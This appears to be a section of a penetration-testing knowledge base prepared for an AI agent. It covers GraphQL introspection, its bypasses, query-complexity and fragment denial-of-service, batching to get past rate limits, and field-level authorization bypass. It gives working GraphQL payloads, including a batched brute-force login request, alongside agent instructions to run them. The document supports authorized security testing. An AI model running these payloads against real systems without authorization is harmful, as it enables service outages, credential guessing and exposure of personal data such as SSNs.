# GraphQL Advanced: Introspection & Complexity Attacks — Agent Chunk 28a
> Source: 07-advanced-api-vulnerability-classes.md
> Purpose: Test GraphQL APIs for introspection exploitation, query complexity/depth attacks, batching abuse, and field-level authorization bypass
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
First attempt GraphQL introspection (__schema query) to map the entire schema. If blocked, try alternative introspection techniques (field suggestions, GET vs POST, header manipulation). Test query complexity attacks: create deeply nested queries (10+ levels), wide queries (request all fields of all types), and circular reference queries to cause DoS. Test batching: send arrays of queries in single requests to bypass rate limiting. Test field-level authorization by requesting admin-only fields (deletedAt, internalNotes, ssn) as a regular user.

---

## 8. GraphQL-Specific Vulnerabilities (Advanced)

### 8.1 Introspection Query Exploitation

GraphQL's introspection system allows clients to query the schema itself, revealing all types, fields, arguments, and relationships. While useful for development, exposing introspection in production is equivalent to publishing a complete API map.

**Full introspection query:**

```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
        args {
          name
          type {
            name
            kind
          }
        }
      }
    }
    mutationType {
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**What this reveals:**
- All available queries and mutations (including admin operations)
- All types and their fields (including sensitive data fields)
- All arguments (including hidden or undocumented parameters)
- Relationships between types (enabling authorization bypass through alternative paths)
- Deprecated fields (which may still function and lack current security controls)

**Bypass techniques when introspection is "disabled":**

```graphql
# Some implementations only check for __schema
# Try __type instead
{
  __type(name: "User") {
    fields {
      name
      type { name }
    }
  }
}

# Try via alias
{
  a: __schema {
    types { name }
  }
}

# Try via fragment
fragment Introspect on __Schema {
  types { name }
}
{
  __schema {
    ...Introspect
  }
}

# Try GET request if POST introspection is blocked
GET /graphql?query={__schema{types{name}}}
```

### 8.2 Query Complexity Attacks (Deeply Nested Queries)

GraphQL allows clients to request arbitrarily nested data. Without complexity limits, a single query can cause exponential database load.

**Circular reference attack:**

```graphql
# If User has friends (which are Users), and friends have friends...
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  name
                  email
                }
              }
            }
          }
        }
      }
    }
  }
}
```

Each level multiplies the number of database queries. With 7 levels and an average of 50 friends per user, this query could trigger 50^7 = 781 billion database lookups.

**Alias-based DoS:**

```graphql
{
  a1: user(id: 1) { name email }
  a2: user(id: 2) { name email }
  a3: user(id: 3) { name email }
  # ... 
  a10000: user(id: 10000) { name email }
}
```

Aliases allow the same field to be queried multiple times in a single request, each as a separate database query. This bypasses per-query rate limits that count "one request = one query."

**Fragment spread attack:**

```graphql
fragment A on User {
  friends {
    ...B
  }
}

fragment B on User {
  friends {
    ...A
  }
}

{
  user(id: 1) {
    ...A
  }
}
```

Some GraphQL implementations do not detect circular fragment references and enter infinite recursion.

### 8.3 Batching Attacks

Most GraphQL implementations accept arrays of queries in a single request:

```json
POST /graphql HTTP/1.1
Content-Type: application/json

[
  {"query": "mutation { login(user: \"admin\", pass: \"password1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password2\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"password3\") { token } }"},
  // ... 997 more attempts
  {"query": "mutation { login(user: \"admin\", pass: \"password1000\") { token } }"}
]
```

This sends 1000 login attempts in a single HTTP request, potentially bypassing:
- IP-based rate limiting (one IP, one request)
- Per-request rate limiting (one request, 1000 operations)
- WAF rules that inspect individual requests

### 8.4 Field-Level Authorization Bypass

**Direct access vs. relationship traversal:**

```graphql
# Direct access blocked
{
  user(id: 42) {
    ssn  # Returns null or error - authorization check applied
  }
}

# Access through relationship may bypass check
{
  order(id: 100) {
    customer {
      ssn  # Authorization check may not be applied when accessed via relationship
    }
  }
}
```

Authorization checks are often applied at the resolver level. If the `ssn` field's resolver checks authorization when accessed directly on the `User` type, but not when accessed through the `Order.customer` relationship, the attacker can bypass the check.

